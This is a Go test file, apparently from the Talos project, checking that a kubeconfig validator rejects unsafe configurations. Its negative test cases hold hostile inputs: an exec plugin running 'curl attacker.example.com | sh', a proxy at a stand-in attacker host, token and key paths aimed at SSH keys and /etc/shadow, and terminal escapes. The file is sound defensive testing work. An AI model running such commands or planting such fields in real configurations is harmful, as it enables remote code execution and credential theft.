// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

package kubeconfig_test

import (
	"bytes"
	"testing"
	"time"

	"github.com/siderolabs/crypto/x509"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"k8s.io/apimachinery/pkg/runtime"
	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"

	"github.com/siderolabs/talos/pkg/kubeconfig"
)

// generateTestKubeconfig generates a kubeconfig the way Talos does it for the `kubeconfig` API.
func generateTestKubeconfig(t *testing.T) []byte {
	t.Helper()

	ca, err := x509.NewSelfSignedCertificateAuthority(x509.RSA(false))
	require.NoError(t, err)

	k8sCA := x509.NewCertificateAndKeyFromCertificateAuthority(ca)

	var buf bytes.Buffer

	require.NoError(t, kubeconfig.Generate(&kubeconfig.GenerateInput{
		ClusterName: "talos-default",

		IssuingCA:           k8sCA,
		AcceptedCAs:         []*x509.PEMEncodedCertificate{{Crt: k8sCA.Crt}},
		CertificateLifetime: time.Hour,

		CommonName:   "admin",
		Organization: "system:masters",

		Endpoint:    "https://localhost:6443/",
		Username:    "admin",
		ContextName: "admin",
	}, &buf))

	return buf.Bytes()
}

func TestValidateGenerated(t *testing.T) {
	t.Parallel()

	config, err := kubeconfig.LoadAndValidate(generateTestKubeconfig(t))
	require.NoError(t, err)

	assert.Equal(t, "admin@talos-default", config.CurrentContext)

	// clientcmd.Load strips the TypeMeta, so kind/apiVersion are empty even though Talos
	// generates them: validation has to tolerate that.
	assert.Empty(t, config.Kind)
	assert.Empty(t, config.APIVersion)
}

func TestValidateNotAKubeconfig(t *testing.T) {
	t.Parallel()

	_, err := kubeconfig.LoadAndValidate([]byte("\tnot: [a, kubeconfig"))
	assert.ErrorContains(t, err, "error parsing kubeconfig")

	_, err = kubeconfig.LoadAndValidate(nil)
	assert.ErrorIs(t, err, kubeconfig.ErrInvalidKubeconfig)
}

//nolint:maintidx
func TestValidateRejects(t *testing.T) {
	t.Parallel()

	valid := generateTestKubeconfig(t)

	for _, test := range []struct {
		name          string
		mutate        func(*clientcmdapi.Config)
		expectedError string
	}{
		{
			name: "exec credential plugin",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec = &clientcmdapi.ExecConfig{
					APIVersion: "client.authentication.k8s.io/v1",
					Command:    "/bin/sh",
					Args:       []string{"-c", "curl attacker.example.com | sh"},
				}
			},
			expectedError: `user field "exec" is not allowed`,
		},
		{
			name: "auth provider",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).AuthProvider = &clientcmdapi.AuthProviderConfig{Name: "gcp"}
			},
			expectedError: `user field "auth-provider" is not allowed`,
		},
		{
			name: "bearer token",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Token = "deadbeef"
			},
			expectedError: `user field "token" is not allowed`,
		},
		{
			name: "token file",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).TokenFile = "/home/user/.ssh/id_ed25519"
			},
			expectedError: `user field "tokenFile" is not allowed`,
		},
		{
			name: "client certificate path",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).ClientCertificate = "/etc/shadow"
			},
			expectedError: `user field "client-certificate" is not allowed`,
		},
		{
			name: "client key path",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).ClientKey = "/etc/shadow"
			},
			expectedError: `user field "client-key" is not allowed`,
		},
		{
			name: "impersonation",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Impersonate = "system:admin"
			},
			expectedError: `user field "act-as" is not allowed`,
		},
		{
			name: "basic auth",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Username = "admin"
				authInfo(config).Password = "admin"
			},
			expectedError: `user field "password" is not allowed`,
		},
		{
			name: "no client certificate",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).ClientCertificateData = nil
			},
			expectedError: `user field "client-certificate-data" is not set`,
		},
		{
			name: "client key doesn't match the certificate",
			mutate: func(config *clientcmdapi.Config) {
				other, err := x509.NewSelfSignedCertificateAuthority(x509.RSA(false))
				require.NoError(t, err)

				authInfo(config).ClientKeyData = other.KeyPEM
			},
			expectedError: "invalid client certificate and key pair",
		},
		{
			name: "proxy URL",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).ProxyURL = "socks5://attacker.example.com:1080"
			},
			expectedError: `cluster field "proxy-url" is not allowed`,
		},
		{
			name: "insecure skip TLS verify",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).InsecureSkipTLSVerify = true
			},
			expectedError: `cluster field "insecure-skip-tls-verify" is not allowed`,
		},
		{
			name: "TLS server name",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).TLSServerName = "kubernetes.default"
			},
			expectedError: `cluster field "tls-server-name" is not allowed`,
		},
		{
			name: "certificate authority path",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthority = "/etc/ssl/certs/ca-certificates.crt"
			},
			expectedError: `cluster field "certificate-authority" is not allowed`,
		},
		{
			name: "no server CA",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthorityData = nil
			},
			expectedError: `cluster field "certificate-authority-data" is not set`,
		},
		{
			name: "server CA is not a certificate",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthorityData = authInfo(config).ClientKeyData
			},
			expectedError: "unexpected PEM block type",
		},
		{
			name: "garbage after the server CA",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthorityData = append(cluster(config).CertificateAuthorityData, []byte("trailing")...)
			},
			expectedError: "trailing data after the PEM-encoded certificates",
		},
		{
			name: "non-HTTP server URL",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).Server = "unix:///var/run/attacker.sock"
			},
			expectedError: `unexpected cluster server URL scheme "unix"`,
		},
		{
			name: "extra cluster",
			mutate: func(config *clientcmdapi.Config) {
				config.Clusters["extra"] = clientcmdapi.NewCluster()
			},
			expectedError: "expected exactly one cluster, got 2",
		},
		{
			name: "extra user",
			mutate: func(config *clientcmdapi.Config) {
				config.AuthInfos["extra"] = clientcmdapi.NewAuthInfo()
			},
			expectedError: "expected exactly one user, got 2",
		},
		{
			name: "extra context",
			mutate: func(config *clientcmdapi.Config) {
				config.Contexts["extra"] = clientcmdapi.NewContext()
			},
			expectedError: "expected exactly one context, got 2",
		},
		{
			name: "current context points elsewhere",
			mutate: func(config *clientcmdapi.Config) {
				config.CurrentContext = "victim-production"
			},
			expectedError: `current-context "victim-production" doesn't match the only context "admin@talos-default"`,
		},
		{
			name: "context references another cluster",
			mutate: func(config *clientcmdapi.Config) {
				kubeContext(config).Cluster = "victim-production"
			},
			expectedError: `context references cluster "victim-production"`,
		},
		{
			name: "context references another user",
			mutate: func(config *clientcmdapi.Config) {
				kubeContext(config).AuthInfo = "victim-admin"
			},
			expectedError: `context references user "victim-admin"`,
		},
		{
			name: "terminal escapes in the cluster name",
			mutate: func(config *clientcmdapi.Config) {
				rename(config.Clusters, "talos-default", "talos\x1b[2Jdefault")
				kubeContext(config).Cluster = "talos\x1b[2Jdefault"
			},
			expectedError: "cluster name contains control characters",
		},
		{
			name: "context namespace is not the default one",
			mutate: func(config *clientcmdapi.Config) {
				kubeContext(config).Namespace = "kube-system"
			},
			expectedError: `unexpected context namespace "kube-system", expected "default"`,
		},
		{
			name: "wrong kind",
			mutate: func(config *clientcmdapi.Config) {
				config.Kind = "Secret"
			},
			expectedError: `unexpected kind "Secret"`,
		},
		{
			name: "wrong apiVersion",
			mutate: func(config *clientcmdapi.Config) {
				config.APIVersion = "client.authentication.k8s.io/v1"
			},
			expectedError: `unexpected apiVersion "client.authentication.k8s.io/v1"`,
		},
		{
			name: "server URL without a host",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).Server = "https://"
			},
			expectedError: "cluster server URL has no host",
		},
		{
			name: "server URL with embedded credentials",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).Server = "https://user:password@localhost:6443/"
			},
			expectedError: "cluster server URL has embedded credentials",
		},
		{
			name: "extensions",
			mutate: func(config *clientcmdapi.Config) {
				config.Extensions = map[string]runtime.Object{"foo": nil}
			},
			expectedError: `top-level field "extensions" is not allowed`,
		},
		{
			name: "preferences",
			mutate: func(config *clientcmdapi.Config) {
				config.Preferences.Colors = true
			},
			expectedError: `top-level field "preferences" is not allowed`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()

			config, err := kubeconfig.LoadAndValidate(valid)
			require.NoError(t, err)

			test.mutate(config)

			err = kubeconfig.Validate(config)
			require.Error(t, err)
			assert.ErrorIs(t, err, kubeconfig.ErrInvalidKubeconfig)
			assert.ErrorContains(t, err, test.expectedError)
		})
	}
}

func cluster(config *clientcmdapi.Config) *clientcmdapi.Cluster {
	return config.Clusters["talos-default"]
}

func authInfo(config *clientcmdapi.Config) *clientcmdapi.AuthInfo {
	return config.AuthInfos["admin@talos-default"]
}

func kubeContext(config *clientcmdapi.Config) *clientcmdapi.Context {
	return config.Contexts["admin@talos-default"]
}

func rename[T any](m map[string]*T, from, to string) {
	m[to] = m[from]
	delete(m, from)
}
